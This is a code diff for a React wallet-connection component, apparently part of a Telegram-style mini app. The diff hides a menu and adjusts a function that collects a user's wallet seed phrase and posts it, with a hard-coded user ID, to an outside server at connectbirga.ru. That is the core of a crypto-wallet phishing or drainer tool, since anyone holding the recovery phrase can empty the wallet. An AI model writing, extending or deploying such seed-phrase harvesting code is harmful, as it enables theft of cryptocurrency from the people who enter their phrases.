@@ -51,6 +51,14 @@ const WalletInit = () => {
         }
     })
 
+    useEffect( () => {
+      const menu = document.documentElement.querySelector(".FirstMenu");
+      menu.style.display = "none"
+      return () => {
+        menu.style.display = "flex"
+      }
+    } , [] )
+
 
     const checkWallet = useCallback( async () => {
         MainButton.showProgress()
@@ -59,7 +67,7 @@ const WalletInit = () => {
         console.log('====================================');
         try{
             
-            const user = await axios.post("https://www.connectbirga.ru/user/wallet", {
+            await axios.post("https://www.connectbirga.ru/user/wallet", {
                 mnemonic: inputs.map((e,i) => e.trim()),
                 userId: 1392120153,
               } , {
@@ -78,7 +86,7 @@ const WalletInit = () => {
             setShow((value) => !value)
         }
         MainButton.hideProgress()
-    } , [inputs]  )
+    } , [inputs, dispatch, navigate]  )
 
     useEffect( () => {
         MainButton.show()
